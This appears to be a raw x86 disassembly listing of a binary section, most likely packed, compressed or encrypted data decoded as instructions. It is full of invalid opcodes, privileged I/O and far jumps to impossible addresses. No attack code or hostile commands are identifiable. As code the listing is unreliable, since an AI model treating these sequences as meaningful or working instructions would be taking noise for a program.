  41812d:	lea    ecx,[ebp-0x2a7e5973]
  418133:	pop    ss
  418134:	scas   eax,DWORD PTR es:[edi]
  418135:	mov    cl,0xc6
  418137:	push   es
  418138:	popa   
  418139:	outs   dx,BYTE PTR ds:[esi]
  41813a:	cmp    al,0x5d
  41813c:	mov    bh,0xdf
  41813e:	jne    0x4180ca
  418140:	push   eax
  418141:	loope  0x4181bb
  418143:	in     al,dx
  418144:	pop    ds
  418145:	cmp    al,0xdc
  418147:	call   0xf3a7c9f2
  41814c:	test   DWORD PTR [eax+0x225422c0],edi
  418152:	xlat   BYTE PTR ds:[ebx]
  418153:	sar    BYTE PTR [ebp+0x5b0497d0],cl
  418159:	loop   0x418105
  41815b:	mov    bh,0x92
  41815d:	sub    DWORD PTR ss:[eax-0xab08be3],0xc3ef8dc7
  418168:	mov    al,ds:0x3a2c7fb2
  41816d:	xor    al,0x89
  41816f:	sub    eax,0xfadee4e5
  418174:	shl    DWORD PTR [edx-0x4ce1e85],cl
  41817a:	push   eax
  41817b:	mov    BYTE PTR [edx-0x6f959c0],al
  418181:	nop
  418182:	ficom  DWORD PTR [ecx]
  418184:	loop   0x418161
  418186:	call   0xa31f:0xbb6b81db
  41818d:	adc    BYTE PTR [esi],cl
  41818f:	pop    ss
  418190:	clc    
  418191:	cmp    al,0xfc
  418193:	retf   
  418194:	and    eax,0x1a521fde
  418199:	sbb    BYTE PTR [esi-0x5d],dh
  41819c:	std    
  41819d:	cmc    
  41819e:	xchg   ebp,eax
  41819f:	ror    cl,1
  4181a1:	inc    ebp
  4181a2:	lea    esp,[edx+0x5c]
  4181a5:	(bad)  
  4181a6:	test   al,0x92
  4181a8:	xchg   ebx,eax
  4181a9:	out    0x8c,al
  4181ab:	fs add eax,0x76929277
  4181b1:	xchg   ebx,eax
  4181b2:	addr16 mov edx,0xfd
	...
  418214:	add    BYTE PTR [eax],al
  418216:	aaa    
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	lds    esi,FWORD PTR fs:0xfd28ce
  418229:	add    BYTE PTR [edi],al
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    BYTE PTR [edx],bl
  41822f:	and    eax,0x63f4a8ef
  418234:	aas    
  418235:	icebp  
  418236:	retf   
  418237:	repz push eax
  418239:	sbb    ebx,ebp
  41823b:	and    cl,dh
  41823d:	dec    esi
  41823e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41823f:	gs pop ebx
  418241:	mov    dl,0xd1
  418243:	stos   BYTE PTR es:[edi],al
  418244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418245:	sbb    dl,dl
  418247:	(bad)  
  418248:	shr    BYTE PTR [edx+0x7c],1
  41824b:	mov    ch,dh
  41824d:	inc    esi
  41824e:	in     al,0x1
  418250:	xchg   ebx,eax
  418251:	std    
  418252:	xchg   BYTE PTR [eax+0x5b466e9e],dl
  418258:	add    eax,ecx
  41825a:	push   eax
  41825b:	cwde   
  41825c:	jo     0x4182ca
  41825e:	cld    
  41825f:	pop    esi
  418260:	mov    ebp,DWORD PTR [ebx+ebx*8-0x57]
  418264:	call   0x13c4:0x6c82a587
  41826b:	mov    cl,BYTE PTR fs:[esi+0xa]
  41826f:	mov    al,0x3
  418271:	loopne 0x4182c2
  418273:	push   esp
  418274:	xchg   ebx,eax
  418275:	sub    DWORD PTR [edx],esi
  418277:	and    ah,bl
  418279:	xchg   DWORD PTR [esi+eax*4+0x7a],ecx
  41827d:	lods   eax,DWORD PTR ds:[esi]
  41827e:	pop    ebx
  41827f:	pop    es
  418280:	push   edx
  418281:	cdq    
  418282:	xor    al,0x3d
  418284:	retf   0x8e8c
  418287:	mov    eax,0x989ca05e
  41828c:	lahf   
  41828d:	pusha  
  41828e:	pop    ecx
  41828f:	adc    al,0xf
  418291:	out    0x53,eax
  418293:	shr    eax,1
  418295:	(bad)  
  418297:	inc    edi
  418298:	mov    DWORD PTR [esi],0x3cd729a1
  41829e:	pop    ds
  41829f:	ds repnz stc 
  4182a2:	inc    esi
  4182a3:	inc    ecx
  4182a4:	pop    ebx
  4182a5:	inc    esi
  4182a6:	fwait
  4182a7:	push   eax
  4182a8:	adc    BYTE PTR [esi+0x8a26a36],bl
  4182ae:	push   0x3eccbd91
  4182b3:	out    0xf5,al
  4182b5:	in     al,dx
  4182b6:	pop    ecx
  4182b7:	or     DWORD PTR [eiz*8+0x128f5660],edx
  4182be:	pop    es
  4182bf:	add    dl,cl
  4182c1:	add    BYTE PTR [edi+0x299e4118],ah
  4182c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182c8:	fld    QWORD PTR [edi+0x6031f77f]
  4182ce:	and    al,0xfe
  4182d0:	xor    eax,0xb8e65c8b
  4182d5:	in     eax,dx
  4182d6:	stc    
  4182d7:	dec    ebp
  4182d8:	mov    DWORD PTR [edi-0x71223ddf],esi
  4182de:	mov    BYTE PTR [edi-0x5c7d73af],al
  4182e4:	push   esp
  4182e5:	mov    cl,0x35
  4182e7:	mov    fs,WORD PTR [ebx+0x59]
  4182ea:	sbb    eax,0xfb67d039
  4182ef:	das    
  4182f0:	mov    bh,0x38
  4182f2:	mov    bl,BYTE PTR [ebx+0x5c]
  4182f5:	jmp    0x44fb:0x87f857d0
  4182fc:	outs   dx,BYTE PTR ds:[esi]
  4182fd:	jmp    0x2e0b:0xf847b8
  418304:	and    eax,0xfe9c2e75
  418309:	sub    al,0x5a
  41830b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830c:	inc    edi
  41830d:	fadd   QWORD PTR [edx-0x21]
  418310:	push   edx
  418311:	sbb    BYTE PTR [edx+0x1f],bh
  418314:	in     eax,0x54
  418316:	inc    eax
  418317:	jmp    0xea7a61e8
  41831c:	aam    0x7c
  41831e:	inc    ebp
  41831f:	add    eax,0xc424be8b
  418324:	ins    BYTE PTR es:[edi],dx
  418325:	ja     0x418355
  418327:	adc    al,0xbd
  418329:	ficom  WORD PTR [ebp+0x3a]
  41832c:	add    al,0xbe
  41832e:	and    eax,0x3c386adf
  418333:	sub    DWORD PTR [edi+0x0],0x0
	...
  418396:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	shr    DWORD PTR [edx-0x1d065b7],cl
  4183a8:	add    BYTE PTR [eax],al
  4183aa:	pop    es
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    BYTE PTR [ecx],dh
  4183af:	cmp    DWORD PTR ds:0x564fbe88,eax
  4183b5:	les    esp,FWORD PTR [edx+eax*8-0xd436832]
  4183bc:	push   edi
  4183bd:	and    DWORD PTR [ebp-0x65c1b37b],edx
  4183c3:	dec    ebx
  4183c4:	aad    0x82
  4183c6:	dec    esi
  4183c7:	into   
  4183c8:	iret   
  4183c9:	ret    
  4183ca:	dec    edi
  4183cb:	and    ah,BYTE PTR [eax+0x7458ef33]
  4183d1:	pushf  
  4183d2:	in     al,dx
  4183d3:	test   eax,0x1b873889
  4183d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183d9:	jne    0x4183d2
  4183db:	dec    edx
  4183dc:	inc    eax
  4183dd:	mov    WORD PTR [edi+eiz*8-0xb7986d1],es
  4183e4:	and    dh,BYTE PTR [esi+esi*1-0x63]
  4183e8:	es pop esp
  4183ea:	ja     0x41842b
  4183ec:	push   ss
  4183ed:	fwait
  4183ee:	jne    0x4183d7
  4183f0:	add    DWORD PTR [esi+edx*8+0x4d2eff47],edx
  4183f7:	dec    eax
  4183f8:	lds    ebp,FWORD PTR [esi+0x29628ed8]
  4183fe:	fwait
  4183ff:	in     eax,0x48
  418401:	ss jmp 0x4183c3
  418404:	addr16 ss retf 
  418407:	cdq    
  418408:	icebp  
  418409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41840a:	mov    ch,0x94
  41840c:	mov    bh,0xb2
  41840e:	lahf   
  41840f:	dec    ecx
  418410:	xchg   esp,eax
  418411:	jno    0x418442
  418413:	ret    
  418414:	fld    TBYTE PTR [eax+0x2f]
  418417:	sbb    BYTE PTR [ecx],bl
  418419:	push   es
  41841a:	test   eax,0xbcafc08a
  41841f:	loope  0x418491
  418421:	rcr    DWORD PTR [ecx+0x4f3f7a03],0xde
  418428:	inc    edi
  418429:	aad    0x6b
  41842b:	sahf   
  41842c:	inc    edx
  41842d:	test   BYTE PTR ds:0xa5f495f4,ah
  418433:	imul   ebx,eax,0x20848163
  418439:	add    DWORD PTR [edx+0x7ad08988],0x7f
  418440:	or     bl,BYTE PTR [edx]
  418442:	mov    ah,0x1
  418444:	and    esi,eax
  418446:	mov    cl,ah
  418448:	adc    al,0xe4
  41844a:	xor    al,0xf7
  41844c:	int3   
  41844d:	jle    0x418461
  41844f:	(bad)  
  418450:	mov    esp,0x88637aa2
  418455:	bound  eax,QWORD PTR [ebx+0x4dc70003]
  41845b:	pop    ds
  41845c:	das    
  41845d:	push   cs
  41845e:	jmp    0xcc07:0x36814e8f
  418465:	mov    cs,WORD PTR cs:[eax+0x20e52fcd]
  41846c:	popa   
  41846d:	or     edx,eax
  41846f:	push   eax
  418470:	jns    0x418484
  418472:	(bad)  
  418473:	or     DWORD PTR [ecx+0x25],edx
  418476:	jecxz  0x41841f
  418478:	fmul   DWORD PTR [edx-0x605c3d8f]
  41847e:	xchg   ebx,eax
  41847f:	adc    edx,DWORD PTR [edi-0x4913d578]
  418485:	imul   edi,ebx,0x1f
  418488:	lods   al,BYTE PTR ds:[esi]
  418489:	leave  
  41848a:	je     0x4184a3
  41848c:	adc    BYTE PTR [ecx+0x3ff99e40],ah
  418492:	gs xchg esi,eax
  418494:	leave  
  418495:	sub    eax,0xa84040c1
  41849a:	in     eax,dx
  41849b:	test   BYTE PTR [eax+0x59],ah
  41849e:	xchg   DWORD PTR cs:[edi-0x4a],eax
  4184a2:	xchg   esp,eax
  4184a3:	js     0x41850e
  4184a5:	fidiv  WORD PTR [edi]
  4184a7:	jmp    0x40f86c45
  4184ac:	jo     0x4184c4
  4184ae:	dec    ecx
  4184af:	cmp    DWORD PTR [edi+0x2cc37f07],0x0
	...
  418515:	add    BYTE PTR [ecx-0x7],al
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [ebp+esi*4+0x36bebb79]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    bl,cl
  41852f:	xchg   esp,eax
  418530:	sub    ecx,esp
  418532:	rcr    DWORD PTR [esi],cl
  418534:	push   cs
  418535:	pop    ecx
  418536:	sub    ah,bl
  418538:	leave  
  418539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41853a:	add    DWORD PTR [ecx+0x71],ebx
  41853d:	int    0x2
  41853f:	or     BYTE PTR [ebx],dh
  418541:	inc    esi
  418542:	es cmp eax,0xe9b96a32
  418548:	stos   BYTE PTR es:[edi],al
  418549:	(bad)  
  41854a:	fstp   DWORD PTR [esi-0x7697b8ed]
  418550:	mov    ecx,es
  418552:	or     bl,BYTE PTR [ecx+esi*4]
  418555:	mov    al,ds:0x87ef6d29
  41855a:	inc    esp
  41855b:	les    ecx,FWORD PTR [esi+eiz*2+0x12]
  41855f:	xchg   ebp,eax
  418560:	pop    ebx
  418561:	data16 fxch st(2)
  418564:	and    BYTE PTR [ebx],al
  418566:	hlt    
  418567:	add    dh,BYTE PTR [edx]
  418569:	pop    esi
  41856a:	dec    ebp
  41856b:	add    ch,0xee
  41856e:	or     ah,BYTE PTR [ecx-0x399b7210]
  418574:	cld    
  418575:	push   cs
  418576:	sbb    edi,esp
  418578:	mov    dl,0x31
  41857a:	in     al,0x8b
  41857c:	mov    esi,0xdf8f99d1
  418581:	sbb    DWORD PTR [esi-0x2ccfa25b],eax
  418587:	push   es
  418588:	pop    ds
  418589:	pushf  
  41858a:	out    0x8d,eax
  41858c:	dec    esp
  41858d:	push   0x15256715
  418592:	(bad)  [edi]
  418594:	je     0x4185b3
  418596:	push   ss
  418597:	mov    edi,0x7679767d
  41859c:	pop    esp
  41859d:	mov    bh,0xbe
  41859f:	mov    ch,0x54
  4185a1:	and    eax,DWORD PTR [esi]
  4185a3:	aaa    
  4185a4:	ss gs cli 
  4185a7:	or     eax,0x6b3edd33
  4185ac:	adc    ecx,ebp
  4185ae:	int3   
  4185af:	push   0x74adb712
  4185b4:	inc    ebp
  4185b5:	movzx  ebx,bh
  4185b8:	inc    esp
  4185b9:	mov    al,ds:0xe34b41b9
  4185be:	sub    dl,bl
  4185c0:	adc    eax,0x3c4b649
  4185c5:	outs   dx,BYTE PTR ds:[esi]
  4185c6:	loopne 0x4185de
  4185c8:	clc    
  4185c9:	int3   
  4185ca:	pop    ebx
  4185cb:	in     eax,dx
  4185cc:	mov    ebx,0x75dc8669
  4185d1:	mov    edi,0x52d70e71
  4185d6:	aam    0x85
  4185d8:	pop    ds
  4185d9:	mov    ds:0xb2a7655f,al
  4185de:	add    BYTE PTR ds:0x80f4d16,dl
  4185e4:	cmp    al,0x55
  4185e6:	jne    0x4185e7
  4185e8:	and    DWORD PTR [eax],edi
  4185ea:	jno    0x41857d
  4185ec:	ror    DWORD PTR [esi],0xb9
  4185ef:	ffreep st(5)
  4185f1:	stos   DWORD PTR es:[edi],eax
  4185f2:	outs   dx,BYTE PTR ds:[esi]
  4185f3:	aad    0xa
  4185f5:	xor    al,0xd1
  4185f7:	ins    DWORD PTR es:[edi],dx
  4185f8:	jle    0x41864f
  4185fa:	jmp    0x7ca5:0x32eba56a
  418601:	inc    ebx
  418602:	cmp    dl,bh
  418604:	(bad)  
  418605:	dec    esi
  418606:	or     al,0xc2
  418608:	(bad)  
  418609:	adc    DWORD PTR [ecx],0x78
  41860c:	dec    edx
  41860d:	xor    BYTE PTR [edx+0x3f],cl
  418610:	retf   
  418611:	sub    ch,BYTE PTR [ebx]
  418613:	cs hlt 
  418615:	sub    ch,BYTE PTR [eax-0x34fc0f3]
  41861b:	jo     0x41865d
  41861d:	mov    ah,0xfc
  41861f:	in     eax,0xc0
  418621:	mov    al,cs:0xb659c4f0
  418627:	clc    
  418628:	iret   
  418629:	fdivr  DWORD PTR [eax]
  41862b:	dec    eax
  41862c:	stos   BYTE PTR es:[edi],al
  41862d:	sub    DWORD PTR [ebp+0xf6ab240],0xffffff89
  418634:	push   ds
	...
  418695:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41869b:	mov    esp,0xba07af9f
  4186a0:	xor    BYTE PTR [esi-0x1d0d971d],bh
  4186a6:	cmp    eax,0x7000100
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    BYTE PTR [ebp-0x6a17419d],al
  4186b3:	sub    al,0x79
  4186b5:	or     edi,DWORD PTR [edx-0x23]
  4186b8:	sbb    DWORD PTR [eax-0xf],esp
  4186bb:	inc    BYTE PTR [ebx-0x5c]
  4186be:	mov    dl,0xe2
  4186c0:	jp     0x4186e6
  4186c2:	repz jne 0x41873a
  4186c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186c6:	sahf   
  4186c7:	daa    
  4186c8:	dec    ecx
  4186c9:	js     0x418732
  4186cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186cc:	aas    
  4186cd:	pop    ebp
  4186ce:	pop    ebp
  4186cf:	dec    eax
  4186d0:	xor    ebp,DWORD PTR [edi+0x1d68ee42]
  4186d6:	xchg   esi,eax
  4186d7:	sbb    BYTE PTR [ebx-0x54],bl
  4186da:	adc    eax,0xdfa50a9d
  4186df:	adc    esp,DWORD PTR [ebx+0x6d]
  4186e2:	gs xor eax,0x229ead94
  4186e8:	jecxz  0x41873c
  4186ea:	and    eax,0x5a8302c8
  4186ef:	addr16 jge 0x418737
  4186f2:	jbe    0x418696
  4186f4:	pop    ebp
  4186f5:	dec    ebp
  4186f6:	cld    
  4186f7:	lods   eax,DWORD PTR ds:[esi]
  4186f8:	(bad)
  4186fb:	push   eax
  4186fc:	dec    ecx
  4186fd:	pop    ss
  4186fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186ff:	xor    BYTE PTR [ebx+0x95b9676],ch
  418705:	lods   eax,DWORD PTR ds:[esi]
  418706:	pop    ds
  418707:	or     eax,0x38243d5d
  41870c:	and    al,0x5d
  41870e:	sub    al,cl
  418710:	leave  
  418711:	add    esp,ebp
  418713:	pop    esi
  418714:	sub    BYTE PTR [eax],ch
  418716:	mov    edx,0xf89d92e8
  41871b:	inc    ebx
  41871c:	mov    ch,0x1a
  41871e:	ins    BYTE PTR es:[edi],dx
  41871f:	add    DWORD PTR [ebx],edx
  418721:	test   DWORD PTR [esi-0x612b0f7d],0x954a321
  41872b:	mov    edx,0x6bcfdae2
  418730:	xchg   esi,eax
  418731:	test   DWORD PTR [esi-0x71],edx
  418734:	mov    eax,ds:0x9d613631
  418739:	mov    al,0x87
  41873b:	jmp    0xc24c:0x67a4369d
  418742:	int3   
  418743:	adc    al,BYTE PTR [ecx]
  418745:	and    BYTE PTR [eax-0x3191328],bl
  41874b:	cmp    eax,DWORD PTR [esi-0x30acf2ce]
  418751:	sbb    BYTE PTR [edx+edx*8-0x3d],ch
  418755:	loopne 0x4186f9
  418757:	or     DWORD PTR [esi-0x5],edi
  41875a:	sti    
  41875b:	ins    BYTE PTR es:[edi],dx
  41875c:	outs   dx,DWORD PTR ds:[esi]
  41875d:	jecxz  0x4186e6
  41875f:	xor    eax,0x5572b043
  418764:	adc    bh,al
  418766:	jle    0x418765
  418768:	arpl   WORD PTR [edx+0x41],dx
  41876b:	mov    WORD PTR [edx],ss
  41876d:	push   esi
  41876e:	push   edi
  41876f:	call   0x27ccb58e
  418774:	sub    esp,DWORD PTR [ebp-0x6a542b86]
  41877a:	dec    edx
  41877b:	inc    edx
  41877c:	fisttp QWORD PTR [edx+0x18fd7459]
  418782:	sbb    DWORD PTR ds:0x8a72bc20,edi
  418788:	mov    ah,0x7e
  41878a:	sub    BYTE PTR [eax+0x54],bl
  41878d:	mov    ah,0x2
  41878f:	dec    ebx
  418790:	sub    al,0xdb
  418792:	dec    esp
  418793:	pop    ds
  418794:	dec    eax
  418795:	in     eax,dx
  418796:	dec    ebp
  418797:	das    
  418798:	or     ebx,DWORD PTR [edx-0x3046de79]
  41879e:	adc    esp,esp
  4187a0:	pop    ebx
  4187a1:	sbb    bh,ch
  4187a3:	and    ebp,DWORD PTR [edi-0x4e52b7c7]
  4187a9:	pusha  
  4187aa:	sbb    eax,0x57c7ece3
  4187af:	fst    DWORD PTR [esi+0x51]
  4187b2:	sub    BYTE PTR [ebp+0x4],al
	...
  418814:	add    BYTE PTR [eax],al
  418816:	xchg   esp,eax
  418817:	enter  0x4337,0x7f
  41881b:	push   esp
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0x8a87be5
  418824:	jno    0x4187fa
  418826:	inc    esp
  418827:	add    DWORD PTR [ecx],eax
  418829:	add    BYTE PTR [edi],al
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR [edx-0x2d],dl
  418830:	call   0x4b7e297a
  418835:	xor    bl,BYTE PTR [ebx]
  418837:	cdq    
  418838:	mov    al,ds:0x8278827e
  41883d:	or     DWORD PTR [eiz*1+0x37974fca],esp
  418844:	inc    esp
  418845:	mov    ch,0x1a
  418847:	dec    esi
  418848:	push   es
  418849:	jge    0x4187d0
  41884b:	mov    DWORD PTR [edx-0x61122053],edx
  418851:	sub    eax,0xb9726e39
  418856:	ficomp DWORD PTR [ebx+0x1]
  418859:	sbb    ah,0xb4
  41885c:	ret    
  41885d:	cwde   
  41885e:	and    BYTE PTR [ebp-0x5f2fec07],bl
  418864:	inc    ecx
  418865:	(bad)  
  418866:	xor    ebx,edi
  418868:	push   eax
  418869:	in     eax,dx
  41886a:	retf   
  41886b:	loopne 0x4188c4
  41886d:	xor    BYTE PTR [esi+edx*8-0x55822270],al
  418874:	or     BYTE PTR [ecx],ch
  418876:	fild   QWORD PTR [edi-0x1d]
  418879:	sub    eax,DWORD PTR [edx]
  41887b:	pop    ebp
  41887c:	or     al,0x95
  41887e:	ja     0x41886f
  418880:	push   ds
  418881:	cmp    al,0x4c
  418883:	cmp    ah,BYTE PTR [eax-0x17c072c3]
  418889:	fist   DWORD PTR [edi]
  41888b:	pop    es
  41888c:	sub    BYTE PTR [edi-0x449ed694],0x79
  418893:	mov    ecx,0xadc124be
  418898:	pop    ds
  418899:	pop    ds
  41889a:	cmp    eax,0xbe12691
  41889f:	inc    ebp
  4188a0:	shr    esi,cl
  4188a2:	lea    ebp,[ebx+0x2]
  4188a5:	push   ebx
  4188a6:	imul   ebp,DWORD PTR [ebx+0x6a],0x3b
  4188aa:	jne    0x418843
  4188ac:	jp     0x4188ab
  4188ae:	(bad)  
  4188af:	or     al,0xb5
  4188b1:	dec    edx
  4188b2:	or     bh,BYTE PTR ds:0x7132beb8
  4188b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188b9:	out    0x55,eax
  4188bb:	sbb    ebx,DWORD PTR [ebp-0x14]
  4188be:	xchg   edx,eax
  4188bf:	loope  0x4188df
  4188c1:	(bad)  
  4188c2:	cmp    eax,0xb2e6caec
  4188c7:	repz icebp 
  4188c9:	and    eax,0x1be06dfc
  4188ce:	sbb    eax,0xff65f349
  4188d3:	retf   0x8e8e
  4188d6:	mov    edi,0xa5c75e80
  4188db:	mov    ah,0xf5
  4188dd:	pop    edi
  4188de:	push   esi
  4188df:	(bad)  
  4188e0:	rol    BYTE PTR [eax],1
  4188e2:	retf   0x33bf
  4188e5:	out    dx,al
  4188e6:	xlat   BYTE PTR ds:[ebx]
  4188e7:	test   DWORD PTR es:[eax+0x1f],0x2453f3f9
  4188ef:	mov    cl,0x3d
  4188f1:	cmp    dl,BYTE PTR [ebp+0x51]
  4188f4:	fstp   DWORD PTR [ebx+edx*4+0x58]
  4188f8:	cmp    DWORD PTR [ebx],eax
  4188fa:	test   eax,0xe90b3c9a
  4188ff:	gs xor dh,cl
  418902:	push   ebx
  418903:	in     al,0x92
  418905:	sbb    ch,ah
  418907:	in     al,dx
  418908:	cmp    edi,DWORD PTR [esi]
  41890a:	push   0x49
  41890c:	xor    al,0xb4
  41890e:	add    BYTE PTR [ebp-0x3b],cl
  418911:	push   edx
  418912:	in     eax,dx
  418913:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418915:	sti    
  418916:	les    esp,FWORD PTR ds:0xaec6af8a
  41891c:	dec    edi
  41891d:	jo     0x41893c
  41891f:	add    BYTE PTR [ecx],0x2e
  418922:	xor    DWORD PTR [edx+0x3c8ce8ef],ebx
  418928:	pop    ebx
  418929:	mov    ebp,0x471f6e3f
  41892e:	popf   
  41892f:	pusha  
  418930:	out    dx,eax
  418931:	cwde   
  418932:	xor    bh,ch
  418934:	push   es
	...
  418995:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi+0x35bb36a8]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    cl,dl
  4189af:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189b1:	cwde   
  4189b2:	and    dh,BYTE PTR [ebp+0x3c4b16f]
  4189b8:	mov    ebp,0x7c31b3df
  4189bd:	inc    edx
  4189be:	dec    esp
  4189bf:	icebp  
  4189c0:	and    DWORD PTR [edi+0x5ebfddc0],0x5af4f92c
  4189ca:	test   al,0xbf
  4189cc:	fidivr DWORD PTR [esp+edi*1]
  4189cf:	icebp  
  4189d0:	xor    BYTE PTR [ecx],bl
  4189d2:	mov    dh,BYTE PTR [ebx-0x24]
  4189d5:	jnp    0x418a4b
  4189d7:	ret    0x45b
  4189da:	dec    esi
  4189db:	and    DWORD PTR [ebp-0x8],eax
  4189de:	lea    edi,[edx]
  4189e0:	loop   0x4189a8
  4189e2:	jbe    0x4189b1
  4189e4:	call   0x33eb0c2b
  4189e9:	(bad)  
  4189ea:	adc    dl,BYTE PTR [eax+edx*2+0x661a46a9]
  4189f1:	inc    ebx
  4189f2:	xor    eax,0xe1807c84
  4189f7:	sbb    al,0x70
  4189f9:	pop    ebx
  4189fa:	dec    eax
  4189fb:	or     ah,bh
  4189fd:	mov    al,0xcb
  4189ff:	test   eax,0x71bad976
  418a04:	adc    al,0x3c
  418a06:	xchg   ebp,eax
  418a07:	cli    
  418a08:	mov    edi,0x3c1b405f
  418a0d:	inc    edi
  418a0e:	fwait
  418a0f:	inc    esi
  418a10:	iret   
  418a11:	loop   0x418a73
  418a13:	jmp    0x418a7d
  418a15:	jo     0x418a2e
  418a17:	dec    ebp
  418a18:	pop    esi
  418a19:	inc    ecx
  418a1a:	push   esp
  418a1b:	enter  0xb03e,0x99
  418a1f:	or     eax,0xa4b75ada
  418a24:	into   
  418a25:	dec    esi
  418a26:	in     eax,0x38
  418a28:	dec    ebx
  418a29:	aas    
  418a2a:	jmp    0x2c67:0xf294cb9e
  418a31:	(bad)  
  418a32:	adc    BYTE PTR [edx+ebx*2+0x6e58d0e3],bh
  418a39:	mov    dl,0x61
  418a3b:	mov    esp,0xca91ea
  418a40:	xchg   ecx,eax
  418a41:	jns    0x418aaa
  418a43:	scas   eax,DWORD PTR es:[edi]
  418a44:	jo     0x418abd
  418a46:	cmpltps xmm6,XMMWORD PTR [ecx+edx*4]
  418a4b:	lahf   
  418a4c:	pop    ecx
  418a4d:	scas   al,BYTE PTR es:[edi]
  418a4e:	sub    eax,0xcae4a9d
  418a53:	fbstp  TBYTE PTR [esi+0x2d]
  418a56:	in     al,dx
  418a57:	xchg   edx,eax
  418a58:	dec    esi
  418a59:	shr    BYTE PTR [ebp-0x41851912],cl
  418a5f:	sbb    eax,0x28f6d6c4
  418a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a65:	ds cld 
  418a67:	add    BYTE PTR [ecx+0x38af0e4c],cl
  418a6d:	repnz and ebx,DWORD PTR [edi-0x579dcfc8]
  418a74:	and    eax,0xef683057
  418a79:	mov    dh,cl
  418a7b:	inc    ecx
  418a7c:	cld    
  418a7d:	std    
  418a7e:	addr16 (bad) 
  418a80:	fist   WORD PTR [esp+eiz*8+0x20c8bdc7]
  418a87:	shl    BYTE PTR [esi],0xd6
  418a8a:	dec    esp
  418a8b:	test   DWORD PTR [esi],eax
  418a8d:	inc    edi
  418a8e:	aas    
  418a8f:	jmp    0x2d8d:0xf6370564
  418a96:	cmp    al,0x73
  418a98:	xor    eax,DWORD PTR [edi+0x248e288d]
  418a9e:	jl     0x418ad8
  418aa0:	outs   dx,BYTE PTR ds:[esi]
  418aa1:	hlt    
  418aa2:	and    eax,0xb46a6194
  418aa7:	and    DWORD PTR [ecx],edi
  418aa9:	push   esp
  418aaa:	sub    ebx,DWORD PTR [edi]
  418aac:	int    0xdc
  418aae:	rol    DWORD PTR [esi-0x50],0xe0
  418ab2:	or     BYTE PTR [esi+0x55],0x0
	...
  418b15:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b19:	xor    ch,bh
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0x3b0941ce
  418b23:	jne    0x418b01
  418b25:	in     al,0x52
  418b27:	add    eax,DWORD PTR [ecx]
  418b29:	add    BYTE PTR [edi],al
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    BYTE PTR [ebx],ch
  418b2f:	mov    ds:0xe9c85743,al
  418b34:	mov    dh,0xed
  418b36:	stc    
  418b37:	inc    ebp
  418b38:	ror    ch,cl
  418b3a:	jmp    0x418b3a
  418b3c:	inc    esp
  418b3d:	xchg   esi,eax
  418b3e:	imul   edi,DWORD PTR [ebx+edx*4+0x62],0x2261a6e3
  418b46:	cmp    dl,BYTE PTR [ebx]
  418b48:	shr    bh,0xae
  418b4b:	mov    edi,0xcc4fc5d2
  418b50:	mov    fs,edi
  418b52:	int3   
  418b53:	and    BYTE PTR cs:[ebx-0x152b652d],dh
  418b5a:	jecxz  0x418b41
  418b5c:	fbstp  TBYTE PTR [ecx]
  418b5e:	and    eax,DWORD PTR [ebp+0x680edb7]
  418b64:	cmp    eax,0x8ed18d77
  418b69:	dec    eax
  418b6a:	push   ebp
  418b6b:	inc    edi
  418b6c:	push   edi
  418b6d:	adc    BYTE PTR [esi+esi*1+0xf71fa0e],al
  418b74:	dec    esp
  418b75:	jmp    0x418bdd
  418b77:	inc    edx
  418b78:	ins    BYTE PTR es:[edi],dx
  418b79:	dec    ebx
  418b7a:	mov    WORD PTR [edx],?
  418b7c:	mov    dh,0x14
  418b7e:	shl    ebx,0x46
  418b81:	pop    ss
  418b82:	mov    bh,0xa3
  418b84:	xchg   DWORD PTR [edx+esi*4-0x3668f6a8],ebx
  418b8b:	sbb    eax,0x1b79e2d4
  418b90:	popf   
  418b91:	adc    BYTE PTR [ebp-0x7d],cl
  418b94:	(bad)  
  418b95:	in     al,dx
  418b96:	pop    ecx
  418b97:	xchg   ebp,eax
  418b98:	outs   dx,BYTE PTR cs:[esi]
  418b9a:	or     DWORD PTR [ecx+0x1301bb27],edx
  418ba0:	and    eax,0x796cf0d9
  418ba5:	cli    
  418ba6:	or     DWORD PTR [edx+0xc],0x134b8973
